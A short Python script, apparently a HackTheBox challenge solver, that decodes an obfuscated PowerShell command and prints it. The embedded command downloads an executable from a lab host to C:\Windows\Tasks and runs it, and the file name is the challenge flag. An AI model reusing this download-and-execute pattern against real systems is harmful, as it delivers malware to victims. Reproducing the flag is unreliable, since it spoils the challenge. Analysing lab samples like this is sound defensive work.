#!/usr/bin/env python3

OBFUSCATED_STRINGS = {
    "{7}{1}{6}{8}{5}{3}{2}{4}{0}": ['}.exe', 'B{msDt_4s_A_pr0', 'E', 'r...s', '3Ms_b4D', 'l3', 'toC', 'HT', '0l_h4nD'],
    "{1}{2}{0}{3}": ['ues', 'Invoke', '-WebReq', 't'],
    "{2}{8}{0}{4}{6}{5}{3}{1}{7}": ['://au', '.htb/2', 'h', 'ic', 'to', 'agnost', 'mation.di', '/n.exe', 'ttps'],
    "{5}{6}{2}{8}{0}{3}{7}{4}{1}": ['L9FTasksL9F', 'ile', 'ow', 'L', 'f', 'C:', 'L9FL9FWind', '9FkzH', 'sL9F']
}

OBFUSCATED_STRING = "${f`ile} = (\"{7}{1}{6}{8}{5}{3}{2}{4}{0}\"-f'}.exe','B{msDt_4s_A_pr0','E','r...s','3Ms_b4D','l3','toC','HT','0l_h4nD')&(\"{1}{2}{0}{3}\"-f'ues','Invoke','-WebReq','t') (\"{2}{8}{0}{4}{6}{5}{3}{1}{7}\"-f'://au','.htb/2','h','ic','to','agnost','mation.di','/n.exe','ttps') -OutFile \"C:\\Windows\\Tasks\\$file\"&(((\"{5}{6}{2}{8}{0}{3}{7}{4}{1}\"-f'L9FTasksL9F','ile','ow','L','f','C:','L9FL9FWind','9FkzH','sL9F'))  -CReplAce'kzH',[chAr]36 -CReplAce([chAr]76+[chAr]57+[chAr]70),[chAr]92)"

if __name__ == '__main__':
    deobfuscated_strings = {}

    for key, value in OBFUSCATED_STRINGS.items():
        normalized_key = key.replace("{", "").replace("}", "")
        decoded_value = ""

        for position in normalized_key:
            decoded_value = decoded_value + value[int(position)]

        deobfuscated_strings[key] = decoded_value

    deobfuscated_string = OBFUSCATED_STRING

    for key, value in OBFUSCATED_STRINGS.items():
        value_ = ','.join(f"'{word}'" for word in value)
        deobfuscated_string = deobfuscated_string.replace(f"\"{key}\"-f{value_}", deobfuscated_strings[key])

    print(deobfuscated_string)
